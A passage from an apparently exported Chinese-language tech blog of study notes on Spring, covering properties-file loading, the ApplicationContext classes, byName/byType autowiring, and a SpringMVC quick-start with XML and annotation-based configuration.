<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">    <span class="comment">&lt;!-- 1、开启context命名空间，需要添加上述和context有关的信息 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2、使用context加载配置文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3、使用$&#123;&#125;动态获取值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果需要加载多个properties文件，可以以英文逗号进行分隔</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties,druid.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用*号加载所有的配置文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果想要加载jar包中的配置文件，可以使用，注意*号的个数和位置的不同</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath*:*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>前面提到了properties文件中变量的命名问题，如果想要在使用${}符获取值时不加载系统属性，可以加上system-properties-mode&#x3D;“NEVER” 解决。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:*.properties&quot;</span> <span class="attr">system-properties-mode</span>=<span class="string">&quot;NEVER&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="四、Spring相关API"><a href="#四、Spring相关API" class="headerlink" title="四、Spring相关API"></a>四、Spring相关API</h1><h2 id="1-ApplicationContext的实现类"><a href="#1-ApplicationContext的实现类" class="headerlink" title="1. ApplicationContext的实现类"></a>1. ApplicationContext的实现类</h2><blockquote>
<ul>
<li><strong><code>ClassPathXmlApplicationContext</code>：从类的根路径下加载配置文件</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong><code>FileSystemXmlApplicationContext</code>：从硬盘路径下加载配置文件，配置文件可在任意位置</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileSystemXmlApplicationContext</span>(<span class="string">&quot;D:\\Idea_Projects\\spring_study\\spring_ioc_test\\src\\main\\resources\\applicationContext.xml&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong><code>AnnotationConfigApplicationContext</code>：当使用注解配置容器对象时，需要用到此类来创建Spring容器。它用来读取注解</strong></li>
</ul>
</blockquote>
<h2 id="2-getBean-方法使用"><a href="#2-getBean-方法使用" class="headerlink" title="2. getBean()方法使用"></a>2. getBean()方法使用</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155610.png"><strong>① 传参为字符串（Bean的id）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需要进行类型强转</span></span><br><span class="line"><span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService)app.getBean(<span class="string">&quot;userService&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>② 传参为Class类型</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不需要进行类型强转（只能在容器中只有一个此类型的Bean才可使用）</span></span><br><span class="line"><span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br></pre></td></tr></table></figure>

<h1 id="五、Bean的自动装配"><a href="#五、Bean的自动装配" class="headerlink" title="五、Bean的自动装配"></a>五、Bean的自动装配</h1><p><strong>由于在手动配置xml过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。采用自动装配将避免这些错误，并且使配置简单化。</strong></p>
<blockquote>
<ul>
<li><strong>自动装配是使用spring满足bean依赖的一种方法</strong></li>
<li><strong>spring会在应用上下文中为某个bean寻找其依赖的bean。</strong></li>
</ul>
<hr>
<p><strong>Spring的自动装配需要从两个角度来实现：</strong>：<br>① 组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean<br>② 自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC&#x2F;DI</p>
</blockquote>
<p>&#x3D;&#x3D;<strong>我们先按照不使用自动装配的方式来完成一个小案例：</strong>&#x3D;&#x3D;</p>
<p><strong>① 新建两个实体类，Child与Parent都有一个<code>eat(</code>)的方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Child</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;child eat~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;parent eat~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 新建一个用户类 User</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Child child;</span><br><span class="line">   <span class="keyword">private</span> Parent parent;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>③ 编写Spring核心配置文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;child&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.Child&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;parent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.Parent&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.User&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;child&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;child&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;parent&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;parent&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tyt&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>④ 搭建一个测试环境</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethodAutowire</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">	<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">	user.getChild().eat();</span><br><span class="line">	user.getParent().eat();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结果正常输出，环境OK</strong></p>
<h2 id="1-byName"><a href="#1-byName" class="headerlink" title="1. byName"></a>1. byName</h2><blockquote>
<ul>
<li><strong><code>autowire byName</code> (按名称自动装配)</strong></li>
</ul>
</blockquote>
<p><strong>① 修改bean配置，增加一个属性 <code>autowire=“byName”</code></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tyt&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>运行，结果正常输出</strong></p>
<p><strong>可以发现，这里省略了上方关于child与parent属性的注入，这就是<code>autowire=&quot;byName&quot;</code>的作用。它的自动装配流程如下：</strong></p>
<blockquote>
<p><strong>① 将查找其类中所有的set方法名，例如setChild，获得将set去掉并且首字母小写的字符串，即child。</strong><br><strong>② 去Spring容器中寻找是否有此字符串名称id的对象。</strong><br><strong>③ 如果有，就取出注入；如果没有，就报空指针异常。</strong></p>
</blockquote>
<p><strong>② 我们更改原child的Bean</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">将</span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;child&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.Child&quot;</span>/&gt;</span></span><br><span class="line">改为</span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;child222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.Child&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>再次运行， 执行时报空指针java.lang.NullPointerException。因为按byName规则获取的是<code>child</code>字符串，但在Spring容器中并无这个id的Bean，真正的setChild就没执行，对象就没有初始化，所以调用时就会报空指针错误。</strong></p>
<hr>
<h2 id="2-byType"><a href="#2-byType" class="headerlink" title="2. byType"></a>2. byType</h2><blockquote>
<ul>
<li><strong><code>autowire byType</code> (按类型自动装配)</strong></li>
</ul>
<hr>
<p><strong>使用<code>autowire byType</code>首先需要保证：<code>同一类型</code>的对象，在Spring容器中<code>唯一</code>。如果不唯一，会报异常<code>NoUniqueBeanDefinitionException</code></strong></p>
</blockquote>
<p><strong>① 修改bean配置，增加一个属性 <code>autowire=“byType”</code></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tyt&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>运行，结果正常输出</strong></p>
<p><strong>可以发现，这里省略了上方关于child与parent属性的注入，这就是<code>autowire=&quot;byName&quot;</code>的作用。它的自动装配流程如下：</strong></p>
<blockquote>
<p><strong>① 将查找其类中所有的set方法名，例如setChild，获得将set去掉并且首字母小写的字符串，即child。</strong><br><strong>② 去Spring容器中寻找是否有此字符串名称id的对象。</strong><br><strong>③ 如果有，就取出注入；如果没有，就报空指针异常。</strong></p>
</blockquote>
<p><strong>② 我们增加一个child的Bean</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;child222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.domain.Child&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>再次运行， 执行时报异常NoUniqueBeanDefinitionException。因为Spring容器中类型Child并不唯一。</strong></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC快速入门</title>
    <url>/posts/839af433.html</url>
    <content><![CDATA[<h1 id="一、SpringMVC概述"><a href="#一、SpringMVC概述" class="headerlink" title="一、SpringMVC概述"></a>一、SpringMVC概述</h1><blockquote>
<ul>
<li><strong>SpringMVC技术与<a href="https://blog.csdn.net/qq_51938362/article/details/125703691?spm=1001.2014.3001.5501">Servlet</a>技术功能等同，均属于web开发技术，可把SpringMVC看成Servlet的升级。</strong></li>
<li><strong><code>SpringMVC</code>是一种基于Java实现的<code>MVC设计模型</code>的请求驱动类型的<code>轻量级Web框架</code>，属于SpringFrameWork的后续产品，已经融合在Spring Web Flow 中。</strong></li>
<li><strong><code>SpringMVC</code>是目前最主流的MVC框架之一，并且随着Spring3.0的发布，全面超越Struts，成为最优秀的MVC框架。它通过一套注解，使一个简单的Java类可以成为处理请求的控制器，并且无需实现任何接口。同时它还支持<code>RESTful</code>编程风格的请求。</strong></li>
</ul>
</blockquote>
<hr>
<p><strong>优点：</strong></p>
<ul>
<li>使用简单，开发便捷（相比于Servlet）<br>原生Servlet：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154748.png">使用SpringMVC：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154748.png"></li>
</ul>
<h1 id="二、入门案例"><a href="#二、入门案例" class="headerlink" title="二、入门案例"></a>二、入门案例</h1><p><strong>导入SpringMVC坐标与Servlet坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>创建Controller和业务方法 使用注解将controller放到Spring容器并配置访问路径</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置当前操作访问路径</span></span><br><span class="line">	<span class="meta">@RequestMapping(&quot;/save&quot;)</span></span><br><span class="line">	<span class="comment">// 设置当前操作返回值类型</span></span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="keyword">public</span> String  <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;user save ....&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;info&#x27;:&#x27;springMvc&#x27;&#125;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-基于XML配置"><a href="#1-基于XML配置" class="headerlink" title="1. 基于XML配置"></a>1. 基于XML配置</h2><p><strong>① 在web.xml配置SpringMVC的核心控制器</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">&lt;!--  配置SpringMVc的前端控制器  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>② 编写核心配置文件（此处命名为spring-mvc.xml），配置组件扫描</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- SpringMVC只管理 com.tyt.controller 包下的类，两句效果相同--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--&lt;context:component-scan base-package=&quot;com.tyt.controller&quot;/&gt;--&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.tyt&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-基于注解"><a href="#2-基于注解" class="headerlink" title="2. 基于注解"></a>2. 基于注解</h2><p><strong>① 编写SpringMVC核心控制器配置类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span> <span class="title class_">AbstractDispatcherServletInitializer</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载SpringMVC容器配置</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> WebApplicationContext <span class="title function_">createServletApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">		<span class="comment">// 注册SpringMVC配置类</span></span><br><span class="line">		app.register(SpringMvcConfig.class);</span><br><span class="line">		<span class="keyword">return</span> app;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 加载Spring容器配置</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> WebApplicationContext <span class="title function_">createRootApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="comment">// 此处只需用到SpringMVC容器，因此Spring容器可直接返回null</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置哪些请求归属SpringMVC处理</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">		<span class="comment">// 定义所有的请求都通过 SpringMVC</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>或（简化上述开发）：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span>  <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载SpringMVC容器配置</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;SpringMvcConfig.class&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 加载Spring容器配置</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置哪些请求归属SpringMVC处理</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>② 初始化SpringMVC环境（同Spring环境），设定SpringMVC加载对象的bean</strong></p>
